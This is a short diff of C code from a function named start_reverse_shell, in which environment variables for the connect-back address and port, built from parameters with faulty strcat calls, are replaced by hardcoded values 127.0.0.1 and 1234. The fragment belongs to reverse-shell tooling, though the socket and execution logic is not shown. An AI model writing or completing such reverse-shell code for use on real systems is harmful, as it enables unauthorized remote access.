@@ -18,8 +18,8 @@ void start_reverse_shell(char *ip, char *port) {
 	char *envp[] = {
 		"HOME=/root",
 		"TERM=xterm",
-		strcat("IP_ADDR", ip),
-		strcat("PORT_ADDR", port),
+		"IP_ADDR=127.0.0.1",
+		"PORT_ADDR=1234",
 		NULL
 	};
 
